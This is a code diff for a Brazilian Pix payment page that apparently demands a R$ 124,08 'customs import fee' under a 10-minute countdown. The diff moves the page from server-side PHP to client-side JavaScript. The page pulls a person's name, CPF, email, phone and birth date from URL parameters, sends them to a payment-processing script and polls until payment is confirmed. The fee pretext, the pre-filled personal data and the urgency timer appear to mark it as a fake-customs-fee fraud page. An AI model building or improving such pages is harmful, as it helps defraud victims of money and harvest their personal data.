@@ -1,12 +1,3 @@
-<?php
-// Recebe os dados via GET ou POST
-$nome = $_GET['nome'] ?? $_POST['nome'] ?? 'Cliente';
-$cpf = $_GET['cpf'] ?? $_POST['cpf'] ?? '';
-$email = $_GET['email'] ?? $_POST['email'] ?? '';
-$telefone = $_GET['telefone'] ?? $_POST['telefone'] ?? '';
-$nascimento = $_GET['nascimento'] ?? $_POST['nascimento'] ?? '';
-$valor = 12408; // R$ 124,08 em centavos
-?>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -259,7 +250,7 @@ $valor = 12408; // R$ 124,08 em centavos
         <div class="content">
             <div class="info-box">
                 <div class="info-label">Destinatário</div>
-                <div class="info-value"><?php echo strtoupper(htmlspecialchars($nome)); ?></div>
+                <div class="info-value" id="destinatario">CLIENTE</div>
                 <div class="description">Taxa alfandegária — importação</div>
             </div>
         </div>
@@ -299,6 +290,21 @@ $valor = 12408; // R$ 124,08 em centavos
         let timerInterval = null;
         let timeLeft = 600; // 10 minutos em segundos
 
+        // Dados vindos da URL (fluxo estático)
+        const urlParams = new URLSearchParams(window.location.search);
+        const dadosCliente = {
+            nome: urlParams.get('nome') || 'Cliente',
+            cpf: (urlParams.get('cpf') || '').replace(/\D/g, ''),
+            email: urlParams.get('email') || '',
+            telefone: urlParams.get('telefone') || '',
+            nascimento: urlParams.get('nascimento') || ''
+        };
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const el = document.getElementById('destinatario');
+            if (el) el.textContent = (dadosCliente.nome || 'Cliente').toUpperCase();
+        });
+
         function abrirModal() {
             const modal = document.getElementById('pixModal');
             modal.style.display = 'flex'; // Mudado para flex para centralizar
@@ -330,23 +336,18 @@ $valor = 12408; // R$ 124,08 em centavos
             }
 
             // Dados do formulário
-            const formData = new FormData();
-            formData.append('cpf', '<?php echo addslashes(preg_replace("/[^0-9]/", "", $cpf)); ?>');
-            formData.append('nome', '<?php echo addslashes($nome); ?>');
-            formData.append('email', '<?php echo addslashes($email); ?>');
-            formData.append('telefone', '<?php echo addslashes($telefone); ?>');
-
-            console.log('Enviando dados:', {
-                cpf: '<?php echo addslashes(preg_replace("/[^0-9]/", "", $cpf)); ?>',
-                nome: '<?php echo addslashes($nome); ?>',
-                email: '<?php echo addslashes($email); ?>',
-                telefone: '<?php echo addslashes($telefone); ?>'
-            });
+            console.log('Enviando dados:', dadosCliente);
 
             // Faz a requisição para criar a transação
             fetch('processar_pagamento.php', {
                 method: 'POST',
-                body: formData
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    cpf: dadosCliente.cpf,
+                    nome: dadosCliente.nome,
+                    email: dadosCliente.email,
+                    telefone: dadosCliente.telefone
+                })
             })
             .then(response => {
                 console.log('Response status:', response.status);
@@ -460,7 +461,11 @@ $valor = 12408; // R$ 124,08 em centavos
         function iniciarVerificacao(transactionId) {
             // Verifica o status a cada 5 segundos
             const verificarInterval = setInterval(() => {
-                fetch(`verificar_pagamento.php?transaction_id=${transactionId}`)
+                fetch('verificar_pagamento.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ transaction_id: transactionId })
+                })
                     .then(response => response.json())
                     .then(data => {
                         if (data.success && data.status === 'PAID') {
@@ -468,7 +473,7 @@ $valor = 12408; // R$ 124,08 em centavos
                             clearInterval(timerInterval);
                             fecharModal();
                             alert('Pagamento confirmado!');
-                            window.location.href = 'pagamento_sucesso.php';
+                            window.location.href = 'pagamento_sucesso.html';
                         }
                     })
                     .catch(error => {
